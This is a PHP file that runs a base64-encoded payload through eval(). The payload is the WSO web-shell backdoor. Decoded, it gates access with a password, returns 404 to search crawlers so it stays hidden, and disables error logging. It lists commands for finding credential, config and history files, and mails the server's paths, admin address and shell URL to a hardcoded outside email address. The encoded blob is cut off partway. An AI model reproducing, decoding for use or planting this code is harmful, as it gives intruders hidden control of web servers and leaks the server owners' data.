<?php eval
("?>".base64_decode("PD9waHAgIyBXZWIgU2hlbGwgYnkgZmVyaWQyMwokYXV0aF9wYXNzID0gbWQ1KCdyb2
90Jyk7CiRjb2xvciA9ICIjZGY1IjsKJGRlZmF1bHRfYWN0aW9uID0gJ0ZpbGVzTWFuJzsKJGRlZmF1bHRfdXNlX
2FqYXggPSB0cnVlOwokZGVmYXVsdF9jaGFyc2V0ID0gJ1dpbmRvd3MtMTI1MSc7CgppZighZW1wdHkoJF9TRVJW
RVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgewogICAgJHVzZXJBZ2VudHMgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJ
wIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIpOwogICAgaWYocHJlZ19tYX
RjaCgnLycgLiBpbXBsb2RlKCd8JywgJHVzZXJBZ2VudHMpIC4gJy9pJywgJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR
0VOVCddKSkgewogICAgICAgIGhlYWRlcignSFRUUC8xLjAgNDA0IE5vdCBGb3VuZCcpOwogICAgICAgIGV4aXQ7
CiAgICB9Cn0KCkBpbmlfc2V0KCdlcnJvcl9sb2cnLE5VTEwpOwpAaW5pX3NldCgnbG9nX2Vycm9ycycsMCk7CkB
pbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLDApOwpAc2V0X3RpbWVfbGltaXQoMCk7CkBzZXRfbWFnaWNfcX
VvdGVzX3J1bnRpbWUoMCk7CkBkZWZpbmUoJ1dTT19WRVJTSU9OJywgJzIuNScpOwoKaWYoZ2V0X21hZ2ljX3F1b
3Rlc19ncGMoKSkgewoJZnVuY3Rpb24gV1NPc3RyaXBzbGFzaGVzKCRhcnJheSkgewoJCXJldHVybiBpc19hcnJh
eSgkYXJyYXkpID8gYXJyYXlfbWFwKCdXU09zdHJpcHNsYXNoZXMnLCAkYXJyYXkpIDogc3RyaXBzbGFzaGVzKCR
hcnJheSk7Cgl9CgkkX1BPU1QgPSBXU09zdHJpcHNsYXNoZXMoJF9QT1NUKTsKICAgICRfQ09PS0lFID0gV1NPc3
RyaXBzbGFzaGVzKCRfQ09PS0lFKTsKfQoKZnVuY3Rpb24gd3NvTG9naW4oKSB7CglkaWUoIjxwcmUgYWxpZ249Y
2VudGVyPjxmb3JtIG1ldGhvZD1wb3N0PlBhc3N3b3JkOiA8aW5wdXQgdHlwZT1wYXNzd29yZCBuYW1lPXBhc3M+
PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSc+Pic+PC9mb3JtPjwvcHJlPiIpOwp9CgpmdW5jdGlvbiBXU09zZXR
jb29raWUoJGssICR2KSB7CiAgICAkX0NPT0tJRVska10gPSAkdjsKICAgIHNldGNvb2tpZSgkaywgJHYpOwp9Cg
ppZighZW1wdHkoJGF1dGhfcGFzcykpIHsKICAgIGlmKGlzc2V0KCRfUE9TVFsncGFzcyddKSAmJiAobWQ1KCRfU
E9TVFsncGFzcyddKSA9PSAkYXV0aF9wYXNzKSkKICAgICAgICBXU09zZXRjb29raWUobWQ1KCRfU0VSVkVSWydI
VFRQX0hPU1QnXSksICRhdXRoX3Bhc3MpOwoKICAgIGlmICghaXNzZXQoJF9DT09LSUVbbWQ1KCRfU0VSVkVSWyd
IVFRQX0hPU1QnXSldKSB8fCAoJF9DT09LSUVbbWQ1KCRfU0VSVkVSWydIVFRQX0hPU1QnXSldICE9ICRhdXRoX3
Bhc3MpKQogICAgICAgIHdzb0xvZ2luKCk7Cn0KCmlmKHN0cnRvbG93ZXIoc3Vic3RyKFBIUF9PUywwLDMpKSA9P
SAid2luIikKCSRvcyA9ICd3aW4nOwplbHNlCgkkb3MgPSAnbml4JzsKCiRzYWZlX21vZGUgPSBAaW5pX2dldCgn
c2FmZV9tb2RlJyk7CmlmKCEkc2FmZV9tb2RlKQogICAgZXJyb3JfcmVwb3J0aW5nKDApOwoKJGRpc2FibGVfZnV
uY3Rpb25zID0gQGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CiRob21lX2N3ZCA9IEBnZXRjd2QoKTsKaW
YoaXNzZXQoJF9QT1NUWydjJ10pKQoJQGNoZGlyKCRfUE9TVFsnYyddKTsKJGN3ZCA9IEBnZXRjd2QoKTsKaWYoJ
G9zID09ICd3aW4nKSB7CgkkaG9tZV9jd2QgPSBzdHJfcmVwbGFjZSgiXFwiLCAiLyIsICRob21lX2N3ZCk7Cgkk
Y3dkID0gc3RyX3JlcGxhY2UoIlxcIiwgIi8iLCAkY3dkKTsKfQppZigkY3dkW3N0cmxlbigkY3dkKS0xXSAhPSA
nLycpCgkkY3dkIC49ICcvJzsKCmlmKCFpc3NldCgkX0NPT0tJRVttZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS
AuICdhamF4J10pKQogICAgJF9DT09LSUVbbWQ1KCRfU0VSVkVSWydIVFRQX0hPU1QnXSkgLiAnYWpheCddID0gK
GJvb2wpJGRlZmF1bHRfdXNlX2FqYXg7CgppZigkb3MgPT0gJ3dpbicpCgkkYWxpYXNlcyA9IGFycmF5KAoJCSJM
aXN0IERpcmVjdG9yeSIgPT4gImRpciIsCiAgICAJIkZpbmQgaW5kZXgucGhwIGluIGN1cnJlbnQgZGlyIiA9PiA
iZGlyIC9zIC93IC9iIGluZGV4LnBocCIsCiAgICAJIkZpbmQgKmNvbmZpZyoucGhwIGluIGN1cnJlbnQgZGlyIi
A9PiAiZGlyIC9zIC93IC9iICpjb25maWcqLnBocCIsCiAgICAJIlNob3cgYWN0aXZlIGNvbm5lY3Rpb25zIiA9P
iAibmV0c3RhdCAtYW4iLAogICAgCSJTaG93IHJ1bm5pbmcgc2VydmljZXMiID0+ICJuZXQgc3RhcnQiLAogICAg
CSJVc2VyIGFjY291bnRzIiA9PiAibmV0IHVzZXIiLAogICAgCSJTaG93IGNvbXB1dGVycyIgPT4gIm5ldCB2aWV
3IiwKCQkiQVJQIFRhYmxlIiA9PiAiYXJwIC1hIiwKCQkiSVAgQ29uZmlndXJhdGlvbiIgPT4gImlwY29uZmlnIC
9hbGwiCgkpOwplbHNlCgkkYWxpYXNlcyA9IGFycmF5KAogIAkJIkxpc3QgZGlyIiA9PiAibHMgLWxoYSIsCgkJI
mxpc3QgZmlsZSBhdHRyaWJ1dGVzIG9uIGEgTGludXggc2Vjb25kIGV4dGVuZGVkIGZpbGUgc3lzdGVtIiA9PiAi
bHNhdHRyIC12YSIsCiAgCQkic2hvdyBvcGVuZWQgcG9ydHMiID0+ICJuZXRzdGF0IC1hbiB8IGdyZXAgLWkgbGl
zdGVuIiwKICAgICAgICAicHJvY2VzcyBzdGF0dXMiID0+ICJwcyBhdXgiLAoJCSJGaW5kIiA9PiAiIiwKICAJCS
JmaW5kIGFsbCBzdWlkIGZpbGVzIiA9PiAiZmluZCAvIC10eXBlIGYgLXBlcm0gLTA0MDAwIC1scyIsCiAgCQkiZ
mluZCBzdWlkIGZpbGVzIGluIGN1cnJlbnQgZGlyIiA9PiAiZmluZCAuIC10eXBlIGYgLXBlcm0gLTA0MDAwIC1s
cyIsCiAgCQkiZmluZCBhbGwgc2dpZCBmaWxlcyIgPT4gImZpbmQgLyAtdHlwZSBmIC1wZXJtIC0wMjAwMCAtbHM
iLAogIAkJImZpbmQgc2dpZCBmaWxlcyBpbiBjdXJyZW50IGRpciIgPT4gImZpbmQgLiAtdHlwZSBmIC1wZXJtIC
0wMjAwMCAtbHMiLAogIAkJImZpbmQgY29uZmlnLmluYy5waHAgZmlsZXMiID0+ICJmaW5kIC8gLXR5cGUgZiAtb
mFtZSBjb25maWcuaW5jLnBocCIsCiAgCQkiZmluZCBjb25maWcqIGZpbGVzIiA9PiAiZmluZCAvIC10eXBlIGYg
LW5hbWUgXCJjb25maWcqXCIiLAogIAkJImZpbmQgY29uZmlnKiBmaWxlcyBpbiBjdXJyZW50IGRpciIgPT4gImZ
pbmQgLiAtdHlwZSBmIC1uYW1lIFwiY29uZmlnKlwiIiwKICAJCSJmaW5kIGFsbCB3cml0YWJsZSBmb2xkZXJzIG
FuZCBmaWxlcyIgPT4gImZpbmQgLyAtcGVybSAtMiAtbHMiLAogIAkJImZpbmQgYWxsIHdyaXRhYmxlIGZvbGRlc
nMgYW5kIGZpbGVzIGluIGN1cnJlbnQgZGlyIiA9PiAiZmluZCAuIC1wZXJtIC0yIC1scyIsCiAgCQkiZmluZCBh
bGwgc2VydmljZS5wd2QgZmlsZXMiID0+ICJmaW5kIC8gLXR5cGUgZiAtbmFtZSBzZXJ2aWNlLnB3ZCIsCiAgCQk
iZmluZCBzZXJ2aWNlLnB3ZCBmaWxlcyBpbiBjdXJyZW50IGRpciIgPT4gImZpbmQgLiAtdHlwZSBmIC1uYW1lIH
NlcnZpY2UucHdkIiwKICAJCSJmaW5kIGFsbCAuaHRwYXNzd2QgZmlsZXMiID0+ICJmaW5kIC8gLXR5cGUgZiAtb
mFtZSAuaHRwYXNzd2QiLAogIAkJImZpbmQgLmh0cGFzc3dkIGZpbGVzIGluIGN1cnJlbnQgZGlyIiA9PiAiZmlu
ZCAuIC10eXBlIGYgLW5hbWUgLmh0cGFzc3dkIiwKICAJCSJmaW5kIGFsbCAuYmFzaF9oaXN0b3J5IGZpbGVzIiA
9PiAiZmluZCAvIC10eXBlIGYgLW5hbWUgLmJhc2hfaGlzdG9yeSIsCiAgCQkiZmluZCAuYmFzaF9oaXN0b3J5IG
ZpbGVzIGluIGN1cnJlbnQgZGlyIiA9PiAiZmluZCAuIC10eXBlIGYgLW5hbWUgLmJhc2hfaGlzdG9yeSIsCiAgC
QkiZmluZCBhbGwgLmZldGNobWFpbHJjIGZpbGVzIiA9PiAiZmluZCAvIC10eXBlIGYgLW5hbWUgLmZldGNobWFp
bHJjIiwKICAJCSJmaW5kIC5mZXRjaG1haWxyYyBmaWxlcyBpbiBjdXJyZW50IGRpciIgPT4gImZpbmQgLiAtdHl
wZSBmIC1uYW1lIC5mZXRjaG1haWxyYyIsCgkJIkxvY2F0ZSIgPT4gIiIsCiAgCQkibG9jYXRlIGh0dHBkLmNvbm
YgZmlsZXMiID0+ICJsb2NhdGUgaHR0cGQuY29uZiIsCgkJImxvY2F0ZSB2aG9zdHMuY29uZiBmaWxlcyIgPT4gI
mxvY2F0ZSB2aG9zdHMuY29uZiIsCgkJImxvY2F0ZSBwcm9mdHBkLmNvbmYgZmlsZXMiID0+ICJsb2NhdGUgcHJv
ZnRwZC5jb25mIiwKCQkibG9jYXRlIHBzeWJuYy5jb25mIGZpbGVzIiA9PiAibG9jYXRlIHBzeWJuYy5jb25mIiw
KCQkibG9jYXRlIG15LmNvbmYgZmlsZXMiID0+ICJsb2NhdGUgbXkuY29uZiIsCgkJImxvY2F0ZSBhZG1pbi5waH
AgZmlsZXMiID0+ImxvY2F0ZSBhZG1pbi5waHAiLAoJCSJsb2NhdGUgY2ZnLnBocCBmaWxlcyIgPT4gImxvY2F0Z
SBjZmcucGhwIiwKCQkibG9jYXRlIGNvbmYucGhwIGZpbGVzIiA9PiAibG9jYXRlIGNvbmYucGhwIiwKCQkibG9j
YXRlIGNvbmZpZy5kYXQgZmlsZXMiID0+ICJsb2NhdGUgY29uZmlnLmRhdCIsCgkJImxvY2F0ZSBjb25maWcucGh
wIGZpbGVzIiA9PiAibG9jYXRlIGNvbmZpZy5waHAiLAoJCSJsb2NhdGUgY29uZmlnLmluYyBmaWxlcyIgPT4gIm
xvY2F0ZSBjb25maWcuaW5jIiwKCQkibG9jYXRlIGNvbmZpZy5pbmMucGhwIiA9PiAibG9jYXRlIGNvbmZpZy5pb
mMucGhwIiwKCQkibG9jYXRlIGNvbmZpZy5kZWZhdWx0LnBocCBmaWxlcyIgPT4gImxvY2F0ZSBjb25maWcuZGVm
YXVsdC5waHAiLAoJCSJsb2NhdGUgY29uZmlnKiBmaWxlcyAiID0+ICJsb2NhdGUgY29uZmlnIiwKCQkibG9jYXR
lIC5jb25mIGZpbGVzIj0+ImxvY2F0ZSAnLmNvbmYnIiwKCQkibG9jYXRlIC5wd2QgZmlsZXMiID0+ICJsb2NhdG
UgJy5wd2QnIiwKCQkibG9jYXRlIC5zcWwgZmlsZXMiID0+ICJsb2NhdGUgJy5zcWwnIiwKCQkibG9jYXRlIC5od
HBhc3N3ZCBmaWxlcyIgPT4gImxvY2F0ZSAnLmh0cGFzc3dkJyIsCgkJImxvY2F0ZSAuYmFzaF9oaXN0b3J5IGZp
bGVzIiA9PiAibG9jYXRlICcuYmFzaF9oaXN0b3J5JyIsCgkJImxvY2F0ZSAubXlzcWxfaGlzdG9yeSBmaWxlcyI
gPT4gImxvY2F0ZSAnLm15c3FsX2hpc3RvcnknIiwKCQkibG9jYXRlIC5mZXRjaG1haWxyYyBmaWxlcyIgPT4gIm
xvY2F0ZSAnLmZldGNobWFpbHJjJyIsCgkJImxvY2F0ZSBiYWNrdXAgZmlsZXMiID0+ICJsb2NhdGUgYmFja3VwI
iwKCQkibG9jYXRlIGR1bXAgZmlsZXMiID0+ICJsb2NhdGUgZHVtcCIsCgkJImxvY2F0ZSBwcml2IGZpbGVzIiA9
PiAibG9jYXRlIHByaXYiCgkpOwokbWU9YmFzZTY0X2RlY29kZSgiWm1WeWFXUXlNMEJuYldGcGJDNWpiMjA9Iik
7CiR0aG09IlNlcnZlciI7CiRmdWNrPSJEb3N5YSBZb2x1IDogIi4kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLi
JcclxuIjsKJGZ1Y2suPSJTZXJ2ZXIgQWRtaW4gOiAiLiRfU0VSVkVSWydTRVJWRVJfQURNSU4nXS4iXHJcbiI7C
iRmdWNrLj0iU2VydmVyIGlzbGV0aW0gc2lzdGVtaSA6ICIuJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddLiJc
clxuIjsKJGZ1Y2suPSJTaGVsbCBMaW5rIDogaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJ
WRVJbJ1BIUF9TRUxGJ10uIlxyXG4iOwokZnVjay49IkF2bGFuYW4gU2l0ZSA6ICIgLiRfU0VSVkVSWydIVFRQX0
hPU1QnXS4iXHJcbiI7Cm1haWwoJG1lLCAkdGhtLCAkZnVjayk7CmZ1bmN0aW9uIHdzb0hlYWRlcigpIHsKCWlmK
GVtcHR5KCRfUE9TVFsnY2hhcnNldCddKSkKCQkkX1BPU1RbJ2NoYXJzZXQnXSA9ICRHTE9CQUxTWydkZWZhdWx0
X2NoYXJzZXQnXTsKCWdsb2JhbCAkY29sb3I7CgllY2hvICI8aHRtbD48aGVhZD48bWV0YSBodHRwLWVxdWl2PSd
Db250ZW50LVR5cGUnIGNvbnRlbnQ9J3RleHQvaHRtbDsgY2hhcnNldD0iIC4gJF9QT1NUWydjaGFyc2V0J10gLi
AiJz48dGl0bGU+SGFsbG93PC90aXRsZT4KPHN0eWxlPgpib2R5e2JhY2tncm91bmQtY29sb3I6IzQ0NDtjb2xvc
jojZTFlMWUxO30KYm9keSx0ZCx0aHsgZm9udDogOXB0IEx1Y2lkYSxWZXJkYW5hO21hcmdpbjowO3ZlcnRpY2Fs
LWFsaWduOnRvcDtjb2xvcjojZTFlMWUxOyB9CnRhYmxlLmluZm97IGNvbG9yOiNmZmY7YmFja2dyb3VuZC1jb2x
vcjojMjIyOyB9CnNwYW4saDEsYXsgY29sb3I6ICRjb2xvciAhaW1wb3J0YW50OyB9CnNwYW57IGZvbnQtd2VpZ2
h0OiBib2xkZXI7IH0KaDF7IGJvcmRlci1sZWZ0OjVweCBzb2xpZCAkY29sb3I7cGFkZGluZzogMnB4IDVweDtmb
250OiAxNHB0IFZlcmRhbmE7YmFja2dyb3VuZC1jb2xvcjojMjIyO21hcmdpbjowcHg7IH0KZGl2LmNvbnRlbnR7
IHBhZGRpbmc6IDVweDttYXJnaW4tbGVmdDo1cHg7YmFja2dyb3VuZC1jb2xvcjojMzMzOyB9CmF7IHRleHQtZGV
jb3JhdGlvbjpub25lOyB9CmE6aG92ZXJ7IHRleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmU7IH0KLm1sMXsgYm9yZG
VyOjFweCBzb2xpZCAjNDQ0O3BhZGRpbmc6NXB4O21hcmdpbjowO292ZXJmbG93OiBhdXRvOyB9Ci5iaWdhcmVhe
yB3aWR0aDoxMDAlO2hlaWdodDozMDBweDsgfQppbnB1dCx0ZXh0YXJlYSxzZWxlY3R7IG1hcmdpbjowO2NvbG9y
OiNmZmY7YmFja2dyb3VuZC1jb2xvcjojNTU1O2JvcmRlcjoxcHggc29saWQgJGNvbG9yOyBmb250OiA5cHQgTW9
ub3NwYWNlLCdDb3VyaWVyIE5ldyc7IH0KZm9ybXsgbWFyZ2luOjBweDsgfQojdG9vbHNUYmx7IHRleHQtYWxpZ2
46Y2VudGVyOyB9Ci50b29sc0lucHsgd2lkdGg6IDMwMHB4IH0KLm1haW4gdGh7dGV4dC1hbGlnbjpsZWZ0O2JhY
2tncm91bmQtY29sb3I6IzVlNWU1ZTt9Ci5tYWluIHRyOmhvdmVye2JhY2tncm91bmQtY29sb3I6IzVlNWU1ZX0K
Lmwxe2JhY2tncm91bmQtY29sb3I6IzQ0NH0KLmwye2JhY2tncm91bmQtY29sb3I6IzMzM30KcHJle2ZvbnQtZmF
taWx5OkNvdXJpZXIsTW9ub3NwYWNlO30KPC9zdHlsZT4KPHNjcmlwdD4KICAgIHZhciBjXyA9ICciIC4gaHRtbH
NwZWNpYWxjaGFycygkR0xPQkFMU1snY3dkJ10pIC4gIic7CiAgICB2YXIgYV8gPSAnIiAuIGh0bWxzcGVjaWFsY
2hhcnMoQCRfUE9TVFsnYSddKSAuIicKICAgIHZhciBjaGFyc2V0XyA9ICciIC4gaHRtbHNwZWNpYWxjaGFycyhA
JF9QT1NUWydjaGFyc2V0J10pIC4iJzsKICAgIHZhciBwMV8gPSAnIiAuICgoc3RycG9zKEAkX1BPU1RbJ3AxJ10
sIlxuIikhPT1mYWxzZSk/Jyc6aHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ3AxJ10sRU5UX1FVT1RFUykpIC4iJz
sKICAgIHZhciBwMl8gPSAnIiAuICgoc3RycG9zKEAkX1BPU1RbJ3AyJ10sIlxuIikhPT1mYWxzZSk/Jyc6aHRtb
HNwZWNpYWxjaGFycygkX1BPU1RbJ3AyJ10sRU5UX1FVT1RFUykpIC4iJzsKICAgIHZhciBwM18gPSAnIiAuICgo
c3RycG9zKEAkX1BPU1RbJ3AzJ10sIlxuIikhPT1mYWxzZSk/Jyc6aHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ3A
zJ10sRU5UX1FVT1RFUykpIC4iJzsKICAgIHZhciBkID0gZG9jdW1lbnQ7CglmdW5jdGlvbiBzZXQoYSxjLHAxLH
AyLHAzLGNoYXJzZXQpIHsKCQlpZihhIT1udWxsKWQubWYuYS52YWx1ZT1hO2Vsc2UgZC5tZi5hLnZhbHVlPWFfO
woJCWlmKGMhPW51bGwpZC5tZi5jLnZhbHVlPWM7ZWxzZSBkLm1mLmMudmFsdWU9Y187CgkJaWYocDEhPW51bGwp
ZC5tZi5wMS52YWx1ZT1wMTtlbHNlIGQubWYucDEudmFsdWU9cDFfOwoJCWlmKHAyIT1udWxsKWQubWYucDIudmF
sdWU9cDI7ZWxzZSBkLm1mLnAyLnZhbHVlPXAyXzsKCQlpZihwMyE9bnVsbClkLm1mLnAzLnZhbHVlPXAzO2Vsc2
UgZC5tZi5wMy52YWx1ZT1wM187CgkJaWYoY2hhcnNldCE9bnVsbClkLm1mLmNoYXJzZXQudmFsdWU9Y2hhcnNld
DtlbHNlIGQubWYuY2hhcnNldC52YWx1ZT1jaGFyc2V0XzsKCX0KCWZ1bmN0aW9uIGcoYSxjLHAxLHAyLHAzLGNo
YXJzZXQpIHsKCQlzZXQoYSxjLHAxLHAyLHAzLGNoYXJzZXQpOwoJCWQubWYuc3VibWl0KCk7Cgl9CglmdW5jdGl
vbiBhKGEsYyxwMSxwMixwMyxjaGFyc2V0KSB7CgkJc2V0KGEsYyxwMSxwMixwMyxjaGFyc2V0KTsKCQl2YXIgcG
FyYW1zID0gJ2FqYXg9dHJ1ZSc7CgkJZm9yKGk9MDtpPGQubWYuZWxlbWVudHMubGVuZ3RoO2krKykKCQkJcGFyY
W1zICs9ICcmJytkLm1mLmVsZW1lbnRzW2ldLm5hbWUrJz0nK2VuY29kZVVSSUNvbXBvbmVudChkLm1mLmVsZW1l
bnRzW2ldLnZhbHVlKTsKCQlzcignIiAuIGFkZHNsYXNoZXMoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIC4iJyw
gcGFyYW1zKTsKCX0KCWZ1bmN0aW9uIHNyKHVybCwgcGFyYW1zKSB7CgkJaWYgKHdpbmRvdy5YTUxIdHRwUmVxdW
VzdCkKCQkJcmVxID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CgkJZWxzZSBpZiAod2luZG93LkFjdGl2ZVhPYmplY
3QpCgkJCXJlcSA9IG5ldyBBY3RpdmVYT2JqZWN0KCdNaWNyb3NvZnQuWE1MSFRUUCcpOwogICAgICAgIGlmIChy
ZXEpIHsKICAgICAgICAgICAgcmVxLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IHByb2Nlc3NSZXFDaGFuZ2U7CiAgICA
gICAgICAgIHJlcS5vcGVuKCdQT1NUJywgdXJsLCB0cnVlKTsKICAgICAgICAgICAgcmVxLnNldFJlcXVlc3RIZW
FkZXIgKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyk7CiAgICAgI
CAgICAgIHJlcS5zZW5kKHBhcmFtcyk7CiAgICAgICAgfQoJfQoJZnVuY3Rpb24gcHJvY2Vzc1JlcUNoYW5nZSgp
IHsKCQlpZiggKHJlcS5yZWFkeVN0YXRlID09IDQpICkKCQkJaWYocmVxLnN0YXR1cyA9PSAyMDApIHsKCQkJCXZ
hciByZWcgPSBuZXcgUmVnRXhwKFwiKFxcXFxkKykoW1xcXFxTXFxcXHNdKilcIiwgJ20nKTsKCQkJCXZhciBhcn
I9cmVnLmV4ZWMocmVxLnJlc3BvbnNlVGV4dCk7CgkJCQlldmFsKGFyclsyXS5zdWJzdHIoMCwgYXJyWzFdKSk7C
gkJCX0gZWxzZSBhbGVydCgnUmVxdWVzdCBlcnJvciEnKTsKCX0KPC9zY3JpcHQ+CjxoZWFkPjxib2R5PjxkaXYg
c3R5bGU9J3Bvc2l0aW9uOmFic29sdXRlO3dpZHRoOjEwMCU7YmFja2dyb3VuZC1jb2xvcjojNDQ0O3RvcDowO2x
lZnQ6MDsnPgo8Zm9ybSBtZXRob2Q9cG9zdCBuYW1lPW1mIHN0eWxlPSdkaXNwbGF5Om5vbmU7Jz4KPGlucHV0IH
R5cGU9aGlkZGVuIG5hbWU9YT4KPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9Yz4KPGlucHV0IHR5cGU9aGlkZGVuI
G5hbWU9cDE+CjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXAyPgo8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1wMz4K
PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9Y2hhcnNldD4KPC9mb3JtPiI7CgkkZnJlZVNwYWNlID0gQGRpc2tmcmV
lc3BhY2UoJEdMT0JBTFNbJ2N3ZCddKTsKCSR0b3RhbFNwYWNlID0gQGRpc2tfdG90YWxfc3BhY2UoJEdMT0JBTF
NbJ2N3ZCddKTsKCSR0b3RhbFNwYWNlID0gJHRvdGFsU3BhY2U/JHRvdGFsU3BhY2U6MTsKCSRyZWxlYXNlID0gQ
HBocF91bmFtZSgncicpOwoJJGtlcm5lbCA9IEBwaHBfdW5hbWUoJ3MnKTsKCSRleHBsaW5rID0gJ2h0dHA6Ly9l
eHBsb2l0LWRiLmNvbS9zZWFyY2gvP2FjdGlvbj1zZWFyY2gmZmlsdGVyX2Rlc2NyaXB0aW9uPSc7CglpZihzdHJ
wb3MoJ0xpbnV4JywgJGtlcm5lbCkgIT09IGZhbHNlKQoJCSRleHBsaW5rIC49IHVybGVuY29kZSgnTGludXggS2
VybmVsICcgLiBzdWJzdHIoJHJlbGVhc2UsMCw2KSk7CgllbHNlCgkJJGV4cGxpbmsgLj0gdXJsZW5jb2RlKCRrZ
XJuZWwgLiAnICcgLiBzdWJzdHIoJHJlbGVhc2UsMCwzKSk7CglpZighZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9n
ZXRlZ2lkJykpIHsKCQkkdXNlciA9IEBnZXRfY3VycmVudF91c2VyKCk7CgkJJHVpZCA9IEBnZXRteXVpZCgpOwo
JCSRnaWQgPSBAZ2V0bXlnaWQoKTsKCQkkZ3JvdXAgPSAiPyI7Cgl9IGVsc2UgewoJCSR1aWQgPSBAcG9zaXhfZ2
V0cHd1aWQocG9zaXhfZ2V0ZXVpZCgpKTsKCQkkZ2lkID0gQHBvc2l4X2dldGdyZ2lkKHBvc2l4X2dldGVnaWQoK
Sk7CgkJJHVzZXIgPSAkdWlkWyduYW1lJ107CgkJJHVpZCA9ICR1aWRbJ3VpZCddOwoJCSRncm91cCA9ICRnaWRb
J25hbWUnXTsKCQkkZ2lkID0gJGdpZFsnZ2lkJ107Cgl9CgoJJGN3ZF9saW5rcyA9ICcnOwoJJHBhdGggPSBleHB
sb2RlKCIvIiwgJEdMT0JBTFNbJ2N3ZCddKTsKCSRuPWNvdW50KCRwYXRoKTsKCWZvcigkaT0wOyAkaTwkbi0xOy
AkaSsrKSB7CgkJJGN3ZF9saW5rcyAuPSAiPGEgaHJlZj0nIycgb25jbGljaz0nZyhcIkZpbGVzTWFuXCIsXCIiO
woJCWZvcigkaj0wOyAkajw9JGk7ICRqKyspCgkJCSRjd2RfbGlua3MgLj0gJHBhdGhbJGpdLicvJzsKCQkkY3dk
X2xpbmtzIC49ICJcIiknPiIuJHBhdGhbJGldLiIvPC9hPiI7Cgl9CgoJJGNoYXJzZXRzID0gYXJyYXkoJ1VURi0
4JywgJ1dpbmRvd3MtMTI1MScsICdLT0k4LVInLCAnS09JOC1VJywgJ2NwODY2Jyk7Cgkkb3B0X2NoYXJzZXRzID
0gJyc7Cglmb3JlYWNoKCRjaGFyc2V0cyBhcyAkaXRlbSkKCQkkb3B0X2NoYXJzZXRzIC49ICc8b3B0aW9uIHZhb
")); ?>